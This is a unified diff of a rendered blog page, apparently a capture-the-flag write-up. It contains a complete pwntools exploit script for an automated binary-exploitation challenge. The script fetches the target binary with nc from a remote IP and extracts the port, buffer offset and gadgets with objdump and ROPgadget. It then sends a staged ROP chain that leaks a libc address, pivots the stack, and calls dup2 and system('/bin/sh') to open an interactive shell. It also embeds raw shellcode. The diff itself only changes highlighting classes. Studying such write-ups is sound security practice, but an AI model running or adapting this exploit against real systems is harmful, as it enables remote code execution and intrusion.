@@ -403,29 +403,29 @@
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
 <span class="c1"># setting 
-</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
 <span class="c1">#context.arch = 'i386'
 #context.arch = 'arm'
 #context.arch = 'aarch64'
-</span><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+</span><span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
 <span class="c1">#elf = ELF(ELF_PATH)
 #libc = ELF(LIBC_PATH)
 </span>
 <span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
     <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
     <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
-        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
         <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
     <span class="k">return</span> <span class="n">res</span>
 
 <span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">sc</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">sc</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="p">):</span>
     <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"i386"</span><span class="p">:</span>
         <span class="c1"># shellcraft.i386.linux.sh(), null free, 22 bytes
 </span>        <span class="k">return</span> <span class="s">"</span><span class="se">\x6a\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0e\x58\x48\x48\x48\x99\xcd\x80</span><span class="s">"</span>
@@ -442,7 +442,7 @@
         <span class="k">return</span> <span class="bp">None</span>
 
 <span class="k">def</span> <span class="nf">str_addr</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">f</span><span class="p">):</span> <span class="c1"># search string address in file
-</span>    <span class="n">result</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+</span>    <span class="n">result</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
     <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">):</span> <span class="c1"># no result
 </span>        <span class="k">return</span> <span class="bp">None</span>
     <span class="k">else</span><span class="p">:</span>
@@ -454,23 +454,23 @@
         <span class="n">myexec</span><span class="p">(</span><span class="s">"nc 52.20.10.244 8888 &gt; asdf"</span><span class="p">)</span> <span class="c1"># download binary
 </span>        
         <span class="n">resp</span> <span class="o">=</span> <span class="n">myexec</span><span class="p">(</span><span class="s">"objdump -d ./asdf | grep </span><span class="se">\"</span><span class="s">htons</span><span class="se">\"</span><span class="s"> -B 1"</span><span class="p">)</span> <span class="c1"># get port number
-</span>        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"--</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
-        <span class="n">port</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">):</span><span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">","</span><span class="p">):]</span>
+</span>        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"--</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">port</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="n">resp</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">):</span><span class="n">resp</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">","</span><span class="p">):]</span>
         <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
         
         <span class="n">resp</span> <span class="o">=</span> <span class="n">myexec</span><span class="p">(</span><span class="s">"objdump -d ./asdf | grep </span><span class="se">\"</span><span class="s">strlen</span><span class="se">\"</span><span class="s"> -B 2"</span><span class="p">)</span> <span class="c1"># get buffer offset
-</span>        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"lea    -"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
-        <span class="n">offset</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="p">[:</span><span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"(</span><span class="si">%</span><span class="s">rbp"</span><span class="p">):],</span> <span class="mi">16</span><span class="p">)</span>
+</span>        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"lea    -"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">offset</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="p">[:</span><span class="n">resp</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"(%rbp"</span><span class="p">):],</span> <span class="mi">16</span><span class="p">)</span>
         
         <span class="n">resp</span> <span class="o">=</span> <span class="n">myexec</span><span class="p">(</span><span class="s">"objdump -d ./asdf | grep </span><span class="se">\"</span><span class="s">read</span><span class="se">\"</span><span class="s"> -B 4"</span><span class="p">)</span> <span class="c1"># read size
-</span>        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"mov"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
-        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">):</span><span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">","</span><span class="p">):]</span>
+</span>        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"mov"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="n">resp</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">):</span><span class="n">resp</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">","</span><span class="p">):]</span>
         <span class="n">read</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
 
         <span class="k">print</span> <span class="s">"==================="</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"port: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"offset: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"read: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">read</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"port: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"offset: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"read: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">read</span><span class="p">))</span>
         
         <span class="k">if</span> <span class="n">read</span> <span class="o">&lt;</span> <span class="mh">0x80</span> <span class="ow">or</span> <span class="n">read</span> <span class="o">&lt;</span> <span class="n">offset</span> <span class="ow">or</span> <span class="n">offset</span><span class="o">-</span><span class="mi">8</span> <span class="o">&lt;</span> <span class="mh">0x78</span><span class="p">:</span> <span class="c1"># exploitable or not
 </span>            <span class="k">continue</span>
@@ -479,15 +479,15 @@
         <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./asdf"</span><span class="p">)</span>
         
         <span class="c1"># use ROPgadget to find some useful address
-</span>        <span class="n">pop_rdi</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">pop rdi</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
-        <span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">pop rsi </span><span class="se">\"</span><span class="s">"</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
-        <span class="n">leave</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">leave</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
-        <span class="n">pop_rbp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">: pop rbp ; ret$</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+</span>        <span class="n">pop_rdi</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">pop rdi</span><span class="se">\"</span><span class="s">"</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">pop rsi </span><span class="se">\"</span><span class="s">"</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">leave</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">leave</span><span class="se">\"</span><span class="s">"</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">pop_rbp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">: pop rbp ; ret$</span><span class="se">\"</span><span class="s">"</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
 
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rdi: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rsi_r15: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">))</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"leave: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leave</span><span class="p">))</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rbp: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rdi: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rsi_r15: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"leave: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leave</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rbp: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">))</span>
         <span class="n">buf1</span> <span class="o">=</span> <span class="mh">0x00602000</span> <span class="o">-</span> <span class="mh">0x200</span>
         <span class="n">buf2</span> <span class="o">=</span> <span class="mh">0x00602000</span> <span class="o">-</span> <span class="mh">0x300</span>
 
@@ -500,32 +500,32 @@
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span>
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf1</span><span class="p">)</span> <span class="c1"># read the 2nd ROP chain to buffer1
 </span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">])</span> <span class="c1"># read(6, buffer1, len)
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">])</span> <span class="c1"># read(6, buffer1, len)
 </span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">)</span> <span class="c1"># stack migration
 </span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf1</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
 
         <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span>
-        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span> <span class="c1"># leak write's GOT
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span> <span class="c1"># leak write's GOT
 </span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span> <span class="c1"># write(6, write@got.plt, len)
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span> <span class="c1"># write(6, write@got.plt, len)
 </span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span>
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="c1"># read the 3rd ROP chain to buffer2
 </span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">])</span> <span class="c1"># read(6, buffer2, len) 
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">])</span> <span class="c1"># read(6, buffer2, len) 
 </span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">)</span> <span class="c1"># stack migration
 </span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        
-        <span class="n">write_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"write_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">))</span>
+        <span class="n">write_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"write_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">))</span>
 
         <span class="c1"># thanks to libc database
 </span>        <span class="c1"># offset_system = 0x0000000000046640
@@ -539,10 +539,10 @@
         <span class="n">dup2_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xebfe0</span>
         <span class="n">sh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x17ccdb</span>
     
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"dup2_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">))</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sh_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"dup2_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">))</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sh_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">))</span>
         
         <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
@@ -559,9 +559,9 @@
 </span>        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
         <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="c1">#system("/bin/sh")
-</span>        <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span>        <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-        <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>And finally we get the flag: <code class="language-plaintext highlighter-rouge">flag{c4nt_w4it_f0r_cgc_7h15_y34r}</code><br />
